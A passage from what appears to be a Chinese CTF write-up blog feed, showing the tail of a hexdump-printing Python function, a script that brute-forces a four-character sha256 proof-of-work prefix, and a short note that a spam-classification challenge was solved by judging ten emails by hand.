<span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">3</span><br>        now += <span class="hljs-string">&#x27; &#x27;</span> * <span class="hljs-number">2</span><br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            <span class="hljs-keyword">if</span> j == <span class="hljs-number">8</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>            <span class="hljs-keyword">if</span> i + j &lt; <span class="hljs-built_in">len</span>(data):<br>                tmp = data[i + j]<br>                <span class="hljs-keyword">if</span> <span class="hljs-number">32</span> &lt;= tmp &lt;= <span class="hljs-number">126</span>:<br>                    now += <span class="hljs-built_in">chr</span>(tmp)<br>                <span class="hljs-keyword">else</span>:<br>                    now += <span class="hljs-string">&#x27;.&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                now += <span class="hljs-string">&#x27; &#x27;</span><br>        now += <span class="hljs-string">&#x27;\n&#x27;</span><br>    <span class="hljs-built_in">print</span>(now[:-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="垃圾邮件分析"><a href="#垃圾邮件分析" class="headerlink" title="垃圾邮件分析"></a>垃圾邮件分析</h2><p>爆破sha256脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python">data = <span class="hljs-string">&#x27;sha256(vKyd2tRZFtkExhiNlPlVTduEqY47 + xxxx) = 4a39288b21b34650b177bdc58c416b3f55305945a9cf87f4bd7b4da2569c10e4&#x27;</span><br>suffix = data.split(<span class="hljs-string">&quot;(&quot;</span>)[<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot; +&quot;</span>)[<span class="hljs-number">0</span>]<br>digest = data.split(<span class="hljs-string">&quot;= &quot;</span>)[<span class="hljs-number">1</span>]<br><br><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> Crypto.Hash <span class="hljs-keyword">import</span> SHA256<br><span class="hljs-keyword">import</span> itertools<br><br>ALPHABET = string.ascii_letters + string.digits<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getProof</span>(<span class="hljs-params">suffix,digest</span>):   <br><br>    <span class="hljs-comment">#print(f&quot;suffix: &#123;suffix&#125;\ndigest: &#123;digest&#125;&quot;)</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product(ALPHABET,repeat=<span class="hljs-number">4</span>):<br>        prefix = <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br>        guess =  suffix + prefix<br>        <span class="hljs-keyword">if</span> sha256(guess.encode()).hexdigest() == digest:<br>            <span class="hljs-comment">#print(f&quot;Find X<span class="hljs-doctag">XXX:</span> &#123;prefix&#125;&quot;)</span><br>            <span class="hljs-keyword">return</span> prefix<br>            <span class="hljs-keyword">break</span><br><br>x = getProof(suffix,digest)<br><span class="hljs-built_in">print</span>(x)<br></code></pre></td></tr></table></figure><p>给50条数据来训练AI，然后给10条邮件让判断是垃圾邮件还是好的邮件<br>不会机器学习，纯靠翻译自己去判断，10条全对就拿到flag了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
